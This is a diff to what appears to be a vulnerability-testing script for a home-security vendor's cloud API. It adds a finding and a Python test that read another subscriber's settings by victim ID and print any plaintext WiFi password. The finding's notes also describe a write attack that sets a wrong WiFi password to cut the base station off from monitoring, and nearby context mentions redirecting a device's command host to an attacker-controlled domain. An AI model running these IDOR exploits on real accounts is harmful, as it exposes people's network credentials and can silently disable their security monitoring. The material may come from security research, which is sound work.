@@ -478,6 +478,25 @@ FINDINGS = [
                   '200+{admin:{obiwanA:"bb1.simplisafe.com"}} = field exposed, IDOR confirmed on read. '
                   'Write test: POST same endpoint with {admin:{obiwanA:"probe.attacker-controlled.test"}}; '
                   '200/204 = write accepted = CRITICAL C2 redirect capability.'),
+    Finding("F42", "CRITICAL", "WiFi PSK Plaintext Exposure via Cloud Normal Settings IDOR (candidate)",
+            "yoda", "/ss3/subscriptions/{sid}/settings", "GET", {"settingsType": "NORMAL"},
+            verified=False,
+            notes='APK: yodaservice/common/SS3NormalSettings.java, SS3NormalSettingsImmutable.java (classes14.dex). '
+                  'SS3NormalSettings fields include: wifiSSID (String), wifiPassword (String) — no encryption layer. '
+                  'SS3SystemSettings.normal @SerializedName("normal") -> returned when settingsType=NORMAL or ALL. '
+                  'Endpoint: GET /ss3/subscriptions/{sid}/settings?settingsType=NORMAL '
+                  'or GET /ss3/subscriptions/{sid}/settings?settingsType=all. '
+                  'If wifiPassword is returned in plaintext (server may mask/null it): '
+                  'IDOR via sid -> victim home/business WiFi PSK exposed directly from cloud REST. '
+                  'Simpler read path than F36 (no crypto gymnastics). '
+                  'Write attack: POST /ss3/subscriptions/{sid}/settings '
+                  '{"settings": {"normal": {"wifiSSID": "victim_ssid", "wifiPassword": "WRONG"}}} '
+                  '-> if accepted, base station cannot reconnect after network drop -> monitoring blackout. '
+                  'Requires auth + victim sid. '
+                  'Test A (read): GET /ss3/subscriptions/{victim_sid}/settings?settingsType=normal -> '
+                  'check if response.settings.normal.wifiPassword is non-null/non-masked. '
+                  'Test B (write): POST same with wrong password -> confirm base station loses cloud connection. '
+                  'VERIFICATION REQUIRED: password may be masked *** server-side — confirm non-null plaintext before asserting CRITICAL.'),
 ]
 
 
@@ -1343,6 +1362,33 @@ def test_recording_deletion_idor(token, victim_clip_id):
         _print("INFO", 404, f"Not found — clipId may belong to different namespace or not exist")
     else:
         _print("INFO", r.status_code, f"recording delete: {r.text[:100]}")
+
+
+def test_wifi_psk_settings_idor(token, victim_sid, probe_ssid="ablation-probe", probe_pw="ABLATION-PROBE-DO-NOT-CONNECT"):
+    """F42: Read WiFi PSK from cloud normal settings + attempt write (requires auth to verify masking)."""
+    print(f"\n=== F42 — WiFi PSK Settings IDOR (sid={victim_sid}) ===")
+    for stype in ["normal", "all"]:
+        r = get(f"{SERVICES['yoda']}/ss3/subscriptions/{victim_sid}/settings?settingsType={stype}",
+                token=token)
+        if r and r.status_code == 200:
+            try:
+                data = r.json()
+                norm = (data.get("settings", {}).get("normal")
+                        or data.get("normal")
+                        or {})
+                ssid = norm.get("wifiSSID")
+                pw = norm.get("wifiPassword")
+                if pw and pw not in ("", None, "***", "****"):
+                    _print("CRIT", 200,
+                           f"WIFI PSK EXPOSED settingsType={stype} sid={victim_sid}: "
+                           f"ssid={ssid} password={pw}")
+                else:
+                    _print("INFO", 200,
+                           f"settingsType={stype}: ssid={ssid} password={pw!r} (masked or null)")
+            except Exception as e:
+                _print("INFO", 200, f"parse err: {e} raw={r.text[:100]}")
+        else:
+            _print("INFO", r.status_code if r else 0, f"settingsType={stype}: {r.text[:60] if r else 'no response'}")
 
 
 def test_monitoring_suspension_idor(token, victim_location_id):
